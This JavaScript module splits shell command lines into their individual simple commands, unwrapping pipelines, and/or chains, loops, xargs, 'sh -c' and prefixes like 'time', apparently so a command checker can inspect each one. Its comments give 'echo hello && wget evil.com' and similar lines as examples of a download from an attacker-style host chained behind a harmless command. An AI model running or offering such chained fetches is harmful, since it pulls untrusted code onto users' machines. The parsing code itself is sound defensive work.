import { _ } from 'golgoth';
import { parse } from 'unbash';
import { extractCommandLineFromShC } from './helpers/extractCommandLineFromShC.js';
import { extractCommandLineFromXargs } from './helpers/extractCommandLineFromXargs.js';

// Shells that support the -c flag for inline command execution
export const SHELL_COMMANDS = ['sh', 'zsh', 'bash'];

// Transparent prefix commands stripped before analyzing the real command
export const PREFIX_COMMANDS = ['time', 'rtk'];

export let __;

/**
 * Extract all simple commands from a command line
 * @param {string} commandLine - The command line to parse
 * @returns {Array<string>} Array of simple commands
 */
export function extractSimpleCommands(commandLine) {
  const ast = parse(commandLine);

  if (!ast.commands.length) {
    return [commandLine];
  }
  return __.extractCommandsFromStatements(commandLine, ast.commands);
}

__ = {
  /**
   * Extract commands from a list of statements
   * @param {string} commandLine - The full command line
   * @param {Array<object>} statements - Array of statement nodes
   * @returns {Array<string>} Array of commands
   */
  extractCommandsFromStatements(commandLine, statements) {
    return _.chain(statements)
      .map((statement) => __.extractFromNode(commandLine, statement.command))
      .flatten()
      .filter((cmd) => !cmd.startsWith('['))
      .value();
  },

  /**
   * Extract command text from a node
   * @param {string} commandLine - The full command line
   * @param {object} node - The AST node to extract from
   * @returns {string|Array<string>} The command text or array of commands
   */
  extractFromNode(commandLine, node) {
    const nodeType = node.type;

    // while true; do echo hello; done
    if (nodeType === 'While') {
      return __.extractFromWhile(commandLine, node);
    }

    // for i in a b c; do echo $i; done
    // for ((i=0; i<10; i++)); do echo $i; done
    if (nodeType === 'For' || nodeType === 'ArithmeticFor') {
      return __.extractCommandsFromStatements(commandLine, node.body.commands);
    }

    // echo hello && wget evil.com
    // echo hello || wget evil.com
    // echo hello | wget evil.com
    if (nodeType === 'AndOr' || nodeType === 'Pipeline') {
      return __.extractFromComplexCommand(commandLine, node);
    }

    if (!node.name) {
      return [];
    }

    const commandName = node.name.text;

    // time echo hello / rtk echo hello
    if (PREFIX_COMMANDS.includes(commandName)) {
      return __.extractFromPrefixCommand(commandLine, node);
    }

    // xargs grep foo
    if (commandName === 'xargs') {
      const commandString = extractCommandLineFromXargs(commandLine, node);
      if (commandString === null) {
        return [];
      }
      return extractSimpleCommands(commandString);
    }

    if (SHELL_COMMANDS.includes(commandName)) {
      const commandString = extractCommandLineFromShC(commandLine, node);
      if (commandString === null) {
        return __.extractTextRange(commandLine, node.name.pos, node.end);
      }
      return extractSimpleCommands(commandString);
    }

    // echo hello (simple Command node)
    return __.extractTextRange(commandLine, node.name.pos, node.end);
  },

  /**
   * Extract the command after a transparent prefix (time, rtk)
   * @param {string} commandLine - The full command line
   * @param {object} node - The prefix Command node
   * @returns {Array<string>} Commands extracted from the suffixed command
   */
  extractFromPrefixCommand(commandLine, node) {
    return extractSimpleCommands(
      __.extractTextRange(commandLine, node.suffix[0].pos, node.end),
    );
  },

  /**
   * Extract text from a range in the command line
   * @param {string} commandLine - The full command line
   * @param {number} startPos - Start position
   * @param {number} endPos - End position
   * @returns {string} Extracted text
   */
  extractTextRange(commandLine, startPos, endPos) {
    return commandLine.substring(startPos, endPos);
  },

  /**
   * Extract commands from while loop
   * @param {string} commandLine - The full command line
   * @param {object} node - The While node
   * @returns {Array<string>} Commands from condition and body
   */
  extractFromWhile(commandLine, node) {
    const clauseCommands = __.extractCommandsFromStatements(
      commandLine,
      node.clause.commands,
    );
    const bodyCommands = __.extractCommandsFromStatements(
      commandLine,
      node.body.commands,
    );
    return [...clauseCommands, ...bodyCommands];
  },

  /**
   * Extract commands from complex command (AndOr or Pipeline)
   * @param {string} commandLine - The full command line
   * @param {object} node - The AndOr or Pipeline node
   * @returns {Array<string>} All commands from the complex structure
   */
  extractFromComplexCommand(commandLine, node) {
    return _.chain(node.commands)
      .map((subCommand) => __.extractFromNode(commandLine, subCommand))
      .flatten()
      .value();
  },
};
